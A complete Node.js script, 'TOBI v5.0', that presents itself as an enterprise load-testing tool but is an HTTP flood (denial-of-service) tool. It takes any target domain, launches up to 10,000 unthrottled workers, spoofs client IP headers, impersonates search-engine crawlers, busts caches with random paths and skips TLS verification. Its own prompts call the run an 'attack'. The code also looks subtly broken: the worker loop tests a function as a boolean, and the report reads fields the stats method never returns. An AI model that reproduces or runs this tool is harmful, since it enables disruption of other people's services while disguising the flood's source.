#!/usr/bin/env node

/**
 * TOBI v5.0 - Enterprise Load Testing Framework
 * Authorized Target Only | No External Dependencies Required
 * Copy this entire file and save as Tobi.js
 */

const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const https = require('https');
const http = require('http');
const readline = require('readline');

// ==================== COLORS ====================
const c = {
    red: '\x1b[91m',
    green: '\x1b[92m',
    yellow: '\x1b[93m',
    blue: '\x1b[94m',
    magenta: '\x1b[95m',
    cyan: '\x1b[96m',
    white: '\x1b[97m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    reset: '\x1b[0m',
    clear: '\x1b[2J\x1b[H'
};

// ==================== CONFIG ====================
let config = {
    target: null,
    duration: 60,
    workers: 1000,
    rate: 0,
    proxyFile: null,
    timeout: 10000
};

// ==================== USER AGENTS ====================
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
];

// ==================== HEADERS ====================
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const acceptLanguages = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9',
    'es-ES,es;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'
];

const referers = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
    'https://github.com/', 'https://stackoverflow.com/', 'https://www.reddit.com/'
];

// ==================== UTILITIES ====================
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomHex(length) {
    return crypto.randomBytes(length).toString('hex');
}

function spoofIP() {
    return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`;
}

function generatePath() {
    const paths = [
        `/${randomString(8)}`,
        `/api/v${randomInt(1,3)}/${randomString(8)}`,
        `/static/${randomHex(6)}`,
        `/content/${randomInt(1000,99999)}`,
        `/search?q=${randomString(10)}`,
        `/page/${randomInt(1,1000)}`,
        `/user/${randomInt(10000,99999)}`,
        `/product/${randomInt(1000,9999)}`
    ];
    
    let path = paths[Math.floor(Math.random() * paths.length)];
    
    if (Math.random() > 0.7) {
        path += (path.includes('?') ? '&' : '?') + `_t=${Date.now()}&_r=${randomString(6)}`;
    }
    
    return path;
}

function generateHeaders(host, spoofedIP) {
    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'X-Forwarded-For': spoofedIP,
        'X-Real-IP': spoofedIP,
        'X-Request-ID': randomHex(8),
        'Referer': referers[Math.floor(Math.random() * referers.length)]
    };
}

// ==================== METRICS CLASS ====================
class Metrics {
    constructor() {
        this.total = 0;
        this.success = 0;
        this.failed = 0;
        this.bytes = 0;
        this.times = [];
        this.codes = new Map();
        this.errors = new Map();
        this.startTime = null;
        this.lastSecond = 0;
        this.lastSecondCount = 0;
        this.peakRps = 0;
    }

    record(success, bytesCount = 0, responseTime = 0, statusCode = null, errorType = null) {
        this.total++;
        success ? this.success++ : this.failed++;
        this.bytes += bytesCount;
        
        if (responseTime > 0 && responseTime < 30) {
            this.times.push(responseTime);
            if (this.times.length > 10000) this.times.shift();
        }
        
        if (statusCode) this.codes.set(statusCode, (this.codes.get(statusCode) || 0) + 1);
        if (errorType) this.errors.set(errorType, (this.errors.get(errorType) || 0) + 1);
        
        const now = Date.now() / 1000;
        if (now - this.lastSecond >= 1) {
            if (this.lastSecondCount > this.peakRps) this.peakRps = this.lastSecondCount;
            this.lastSecondCount = 0;
            this.lastSecond = now;
        }
        this.lastSecondCount++;
    }

    getStats() {
        const elapsed = (Date.now() / 1000) - this.startTime;
        let avg = 0, p95 = 0;
        
        if (this.times.length > 0) {
            const sorted = [...this.times].sort((a, b) => a - b);
            avg = (this.times.reduce((a, b) => a + b, 0) / this.times.length) * 1000;
            p95 = sorted[Math.floor(sorted.length * 0.95)] * 1000;
        }
        
        return {
            total: this.total,
            success: this.success,
            failed: this.failed,
            rate: this.total / Math.max(elapsed, 0.1),
            peakRps: this.peakRps,
            avgMs: avg,
            p95Ms: p95,
            bytesMB: this.bytes / (1024 * 1024),
            successRate: this.total ? (this.success / this.total * 100) : 0,
            elapsed: elapsed
        };
    }

    display() {
        const s = this.getStats();
        const mem = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
        process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${s.rate.toFixed(1)}${c.reset} | ` +
            `${c.green}OK: ${s.success.toLocaleString()}${c.reset} | ` +
            `${c.red}FAIL: ${s.failed.toLocaleString()}${c.reset} | ` +
            `${c.yellow}${s.successRate.toFixed(1)}%${c.reset} | ` +
            `${c.magenta}${s.avgMs.toFixed(0)}ms${c.reset} | ` +
            `${c.dim}MEM: ${mem}MB${c.reset}`);
    }

    final() {
        const s = this.getStats();
        console.log(`\n\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}`);
        console.log(`${c.magenta}${c.bold}║${c.reset}                    ${c.red}🔥 TOBI v5.0 - FINAL REPORT 🔥${c.reset}                    ${c.magenta}${c.bold}║${c.reset}`);
        console.log(`${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}\n`);
        
        console.log(`  ${c.bold}📈 TOTAL REQUESTS:${c.reset}     ${s.total.toLocaleString()}`);
        console.log(`  ${c.bold}✅ SUCCESSFUL:${c.reset}         ${s.success.toLocaleString()}`);
        console.log(`  ${c.bold}❌ FAILED:${c.reset}             ${s.failed.toLocaleString()}`);
        console.log(`  ${c.bold}📊 SUCCESS RATE:${c.reset}       ${s.successRate.toFixed(2)}%`);
        console.log(`  ${c.bold}💾 DATA TRANSFERRED:${c.reset}   ${s.bytesMB.toFixed(2)} MB`);
        console.log(`  ${c.bold}⚡ AVG RPS:${c.reset}            ${s.rate.toFixed(2)}`);
        console.log(`  ${c.bold}🚀 PEAK RPS:${c.reset}           ${s.peakRps}`);
        console.log(`  ${c.bold}⏱️  AVG RESPONSE:${c.reset}       ${s.avgMs.toFixed(2)} ms`);
        console.log(`  ${c.bold}🎯 P95 RESPONSE:${c.reset}       ${s.p95Ms.toFixed(2)} ms`);
        console.log(`  ${c.bold}🕐 DURATION:${c.reset}           ${s.elapsed.toFixed(1)}s`);
        
        if (s.codes && s.codes.size > 0) {
            console.log(`\n  ${c.bold}📋 STATUS CODES:${c.reset}`);
            for (const [code, count] of s.codes) {
                console.log(`    ${code}: ${count.toLocaleString()}`);
            }
        }
        
        console.log(`\n${c.magenta}${c.bold}════════════════════════════════════════════════════════════════════════${c.reset}\n`);
        process.exit(0);
    }
}

// ==================== HTTP REQUEST ====================
function makeRequest(url, options) {
    return new Promise((resolve) => {
        const parsedUrl = new URL(url);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        
        const reqOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            timeout: options.timeout || 10000,
            rejectUnauthorized: false
        };
        
        const req = protocol.request(reqOptions, (res) => {
            let body = [];
            let length = 0;
            
            res.on('data', (chunk) => {
                body.push(chunk);
                length += chunk.length;
                if (length > 1024 * 100) {
                    req.destroy();
                    resolve({ statusCode: res.statusCode, bodyLength: length, success: res.statusCode < 500 });
                }
            });
            
            res.on('end', () => {
                resolve({ statusCode: res.statusCode, bodyLength: length, success: res.statusCode < 500 });
            });
        });
        
        req.on('error', () => {
            resolve({ statusCode: null, bodyLength: 0, success: false, error: 'RequestFailed' });
        });
        
        req.on('timeout', () => {
            req.destroy();
            resolve({ statusCode: null, bodyLength: 0, success: false, error: 'Timeout' });
        });
        
        req.end();
    });
}

// ==================== WORKER ====================
class Worker {
    constructor(id, metrics) {
        this.id = id;
        this.metrics = metrics;
        this.lastReq = 0;
    }

    async run(targetUrl, stopFlag) {
        while (!stopFlag) {
            if (config.rate > 0) {
                const now = Date.now();
                const wait = (1000 / config.rate) - (now - this.lastReq);
                if (wait > 0) await this.sleep(wait);
                this.lastReq = Date.now();
            }
            
            const start = Date.now();
            const path = generatePath();
            const spoofed = spoofIP();
            const host = new URL(targetUrl).host;
            const headers = generateHeaders(host, spoofed);
            
            const result = await makeRequest(targetUrl + path, {
                method: 'GET',
                headers: headers,
                timeout: config.timeout
            });
            
            const elapsed = (Date.now() - start) / 1000;
            this.metrics.record(result.success, result.bodyLength, elapsed, result.statusCode, result.error);
            
            if (Math.random() > 0.95) await this.sleep(Math.random() * 5);
        }
    }

    sleep(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
}

// ==================== INTERACTIVE INPUT ====================
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

function ask(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

async function getConfig() {
    console.log(c.clear);
    console.log(`${c.magenta}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ████████╗ ██████╗ ██████╗ ██╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗
║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
║      ██║   ██║   ██║██████╔╝██║    █████╗  ██║   ██║██████╔╝█████╗  ██████╔╝
║      ██║   ██║   ██║██╔══██╗██║    ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██╗
║      ██║   ╚██████╔╝██████╔╝██║    ███████╗╚██████╔╝██████╔╝███████╗██║  ██║
║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
║                                                                          ║
║                    ${c.red}🔥 TOBI v5.0 - ENTERPRISE LOAD TESTING 🔥${c.magenta}                    ║
║                      No Dependencies Required                              ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    
    console.log(`\n${c.cyan}┌─────────────────────────────────────────────────────────────────┐${c.reset}`);
    console.log(`${c.cyan}│${c.reset}  ${c.bold}⚡ Just paste your domain - No config file needed!${c.reset}              ${c.cyan}│${c.reset}`);
    console.log(`${c.cyan}└─────────────────────────────────────────────────────────────────┘${c.reset}\n`);
    
    let target = await ask(`${c.bold}${c.cyan}🌐 Enter target URL/domain: ${c.reset}`);
    target = target.trim();
    if (!target.startsWith('http')) target = 'https://' + target;
    target = target.replace(/\/$/, '');
    
    let duration = await ask(`${c.bold}${c.cyan}⏱️  Duration (seconds) [default: 60]: ${c.reset}`);
    duration = parseInt(duration) || 60;
    
    let workers = await ask(`${c.bold}${c.cyan}👥 Concurrent workers [default: 1000, max: 10000]: ${c.reset}`);
    workers = Math.min(parseInt(workers) || 1000, 10000);
    
    let rate = await ask(`${c.bold}${c.cyan}🚦 Rate limit per worker (0 = unlimited) [default: 0]: ${c.reset}`);
    rate = parseInt(rate) || 0;
    
    console.log(`\n${c.green}✓ Target: ${target}${c.reset}`);
    console.log(`${c.green}✓ Workers: ${workers.toLocaleString()}${c.reset}`);
    console.log(`${c.green}✓ Duration: ${duration}s${c.reset}`);
    console.log(`${c.green}✓ Rate/Worker: ${rate === 0 ? 'UNLIMITED' : rate}${c.reset}\n`);
    
    let start = await ask(`${c.bold}${c.green}🚀 Start attack? (y/n): ${c.reset}`);
    if (start.toLowerCase() !== 'y') {
        console.log(`${c.yellow}Exiting...${c.reset}`);
        process.exit(0);
    }
    
    rl.close();
    
    return { target, duration, workers, rate };
}

// ==================== BANNER ====================
function showBanner(target, workers, duration) {
    console.log(c.clear);
    console.log(`${c.red}${c.bold}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ████████╗ ██████╗ ██████╗ ██╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗
║   ╚══██╔══╝██╔═══██╗██╔══██╗██║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
║      ██║   ██║   ██║██████╔╝██║    █████╗  ██║   ██║██████╔╝█████╗  ██████╔╝
║      ██║   ██║   ██║██╔══██╗██║    ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██╗
║      ██║   ╚██████╔╝██████╔╝██║    ███████╗╚██████╔╝██████╔╝███████╗██║  ██║
║      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
║                                                                          ║
║                    ${c.red}🔥 TOBI v5.0 - ATTACK IN PROGRESS 🔥${c.reset}${c.red}                    ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    
    console.log(`\n${c.cyan}🎯 Target: ${c.bold}${target}${c.reset}`);
    console.log(`${c.cyan}👥 Workers: ${c.bold}${workers.toLocaleString()}${c.reset}`);
    console.log(`${c.cyan}⏱️  Duration: ${c.bold}${duration}s${c.reset}`);
    console.log(`${c.cyan}⚡ Status: ${c.bold}${c.green}ATTACKING${c.reset}\n`);
}

// ==================== MAIN ====================
async function main() {
    const userConfig = await getConfig();
    config = { ...config, ...userConfig };
    
    showBanner(config.target, config.workers, config.duration);
    
    const metrics = new Metrics();
    metrics.startTime = Date.now() / 1000;
    metrics.lastSecond = metrics.startTime;
    
    let stopFlag = false;
    const workers = [];
    
    process.on('SIGINT', () => {
        console.log(`\n\n${c.yellow}⚠️ Shutting down gracefully...${c.reset}`);
        stopFlag = true;
    });
    
    for (let i = 0; i < config.workers; i++) {
        const worker = new Worker(i, metrics);
        workers.push(worker.run(config.target, () => stopFlag));
        if (i % 500 === 0 && i > 0) await new Promise(r => setTimeout(r, 1));
    }
    
    const interval = setInterval(() => metrics.display(), 500);
    await new Promise(r => setTimeout(r, config.duration * 1000));
    stopFlag = true;
    
    clearInterval(interval);
    await new Promise(r => setTimeout(r, 2000));
    metrics.final();
}

main().catch((err) => {
    console.error(`${c.red}Fatal error: ${err.message}${c.reset}`);
    process.exit(1);
});
